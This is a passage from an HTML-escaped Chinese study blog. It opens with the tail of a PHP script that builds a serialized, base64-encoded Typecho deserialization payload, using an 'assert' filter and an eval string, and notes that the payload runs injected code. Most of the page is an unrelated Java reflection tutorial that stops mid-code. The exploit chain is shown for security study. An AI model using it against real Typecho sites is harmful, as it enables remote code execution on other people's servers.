&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	class Typecho_Request&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		private $_params = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		private $_filter = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$this-&amp;gt;_params = array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&amp;quot;screenName&amp;quot; =&amp;gt; &amp;quot;eval(&amp;#x27;phpinfo();exit;&amp;#x27;)&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$this-&amp;gt;_filter = array(&amp;quot;assert&amp;quot;);          //call_user_func($filter, $value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$a = new Typecho_Feed();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$c = array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;quot;adapter&amp;quot; =&amp;gt; $a,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;quot;prefix&amp;quot; =&amp;gt; &amp;quot;test&amp;quot;,               //$adapterName = &amp;#x27;Typecho_Db_Adapter_&amp;#x27; . $adapterName;s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo base64_encode(serialize($c));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;传入上面的 payload 后，被反序列化，恶意代码执行&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGl0bGlmZS9wLzEwNzk4MDYxLmh0bWw=&#34;&gt;Typecho - 反序列化漏洞学习 - ka1n4t - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;2java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2java&#34;&gt;#&lt;/a&gt; 2.java&lt;/h2&gt;
&lt;h3 id=&#34;反射&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射&#34;&gt;#&lt;/a&gt; 反射&lt;/h3&gt;
&lt;p&gt;Java 的反射是指程序在运行期可以拿到一个对象的所有信息。&lt;/p&gt;
&lt;p&gt;所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。&lt;/p&gt;
&lt;p&gt;这种通过 &lt;code&gt;Class&lt;/code&gt;  实例获取 &lt;code&gt;class&lt;/code&gt;  信息的方法称为反射（Reflection）。&lt;/p&gt;
&lt;p&gt;如何获取一个 &lt;code&gt;class&lt;/code&gt;  的 &lt;code&gt;Class&lt;/code&gt;  实例？有三个方法：&lt;/p&gt;
&lt;p&gt;方法一：直接通过一个 &lt;code&gt;class&lt;/code&gt;  的静态变量 &lt;code&gt;class&lt;/code&gt;  获取：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Class cls = String.class;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;方法二：如果我们有一个实例变量，可以通过该实例变量提供的 &lt;code&gt;getClass()&lt;/code&gt;  方法获取：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;String s = &amp;quot;Hello&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Class cls = s.getClass();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;方法三：如果知道一个 &lt;code&gt;class&lt;/code&gt;  的完整类名，可以通过静态方法 &lt;code&gt;Class.forName()&lt;/code&gt;  获取：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Class cls = Class.forName(&amp;quot;java.lang.String&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;Class&lt;/code&gt;  类提供了以下几个方法来获取字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Field getField (name)：根据字段名获取某个 public 的 field（包括父类）&lt;/li&gt;
&lt;li&gt;Field getDeclaredField (name)：根据字段名获取当前类的某个 field（不包括父类）&lt;/li&gt;
&lt;li&gt;Field [] getFields ()：获取所有 public 的 field（包括父类）&lt;/li&gt;
&lt;li&gt;Field [] getDeclaredFields ()：获取当前类的所有 field（不包括父类）&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Main&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;stdClass&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Student.class;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取public字段&amp;quot;score&amp;quot;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(stdClass.getField(&lt;span class=&#34;string&#34;&gt;&amp;quot;score&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取继承的public字段&amp;quot;name&amp;quot;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(stdClass.getField(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取private字段&amp;quot;grade&amp;quot;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(stdClass.getDeclaredField(&lt;span class=&#34;string&#34;&gt;&amp;quot;grade&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Student&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; score;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; grade;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; String name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一个 &lt;code&gt;Field&lt;/code&gt;  对象包含了一个字段的所有信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getName()&lt;/code&gt; ：返回字段名称，例如， &lt;code&gt;&amp;quot;name&amp;quot;&lt;/code&gt; ；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getType()&lt;/code&gt; ：返回字段类型，也是一个 &lt;code&gt;Class&lt;/code&gt;  实例，例如， &lt;code&gt;String.class&lt;/code&gt; ；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getModifiers()&lt;/code&gt; ：返回字段的修饰符，它是一个 &lt;code&gt;int&lt;/code&gt; ，不同的 bit 表示不同的含义。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; String.class.getDeclaredField(&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f.getName(); &lt;span class=&#34;comment&#34;&gt;// &amp;quot;value&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f.getType(); &lt;span class=&#34;comment&#34;&gt;// class [B 表示byte[]类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; f.getModifiers();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Modifier.isFinal(m); &lt;span class=&#34;comment&#34;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Modifier.isPublic(m); &lt;span class=&#34;comment&#34;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Modifier.isProtected(m); &lt;span class=&#34;comment&#34;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Modifier.isPrivate(m); &lt;span class=&#34;comment&#34;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Modifier.isStatic(m); &lt;span class=&#34;comment&#34;&gt;// false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到字段值&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Main&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Xiao Ming&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; p.getClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; c.getDeclaredField(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; f.get(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(value); &lt;span class=&#34;comment&#34;&gt;// &amp;quot;Xiao Ming&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Person&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; String name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String name)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.name = name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正常情况下， &lt;code&gt;Main&lt;/code&gt;  类无法访问 &lt;code&gt;Person&lt;/code&gt;  类的 &lt;code&gt;private&lt;/code&gt;  字段。要修复错误，可以将 &lt;code&gt;private&lt;/code&gt;  改为 &lt;code&gt;public&lt;/code&gt; ，或者，在调用 &lt;code&gt;Object value = f.get(p);&lt;/code&gt;  前，先写一句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;f.setAccessible(true);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用 &lt;code&gt;Field.setAccessible(true)&lt;/code&gt;  的意思是，别管这个字段是不是 &lt;code&gt;public&lt;/code&gt; ，一律允许访问。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;f.set(p, &amp;quot;Xiao Hong&amp;quot;);&lt;/code&gt;  修改字段值&lt;/p&gt;
&lt;p&gt;同样的，可以通过 &lt;code&gt;Class&lt;/code&gt;  实例获取所有 &lt;code&gt;Method&lt;/code&gt;  信息。 &lt;code&gt;Class&lt;/code&gt;  类提供了以下几个方法来获取 &lt;code&gt;Method&lt;/code&gt; ：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Method getMethod(name, Class...)&lt;/code&gt; ：获取某个 &lt;code&gt;public&lt;/code&gt;  的 &lt;code&gt;Method&lt;/code&gt; （包括父类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Method getDeclaredMethod(name, Class...)&lt;/code&gt; ：获取当前类的某个 &lt;code&gt;Method&lt;/code&gt; （不包括父类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Method[] getMethods()&lt;/code&gt; ：获取所有 &lt;code&gt;public&lt;/code&gt;  的 &lt;code&gt;Method&lt;/code&gt; （包括父类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Method[] getDeclaredMethods()&lt;/code&gt; ：获取当前类的所有 &lt;code&gt;Method&lt;/code&gt; （不包括父类）&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;stdClass&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Student.class;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取public方法getScore，参数为String:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    System.out.println(stdClass.getMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;getScore&amp;quot;&lt;/span&gt;, String.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取继承的public方法getName，无参数:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    System.out.println(stdClass.getMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;getName&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取private方法getGrade，参数为int:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    System.out.println(stdClass.getDeclaredMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;getGrade&amp;quot;&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;调用方法&lt;/strong&gt;。如果用反射来调用 &lt;code&gt;substring&lt;/code&gt;  方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Main&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span 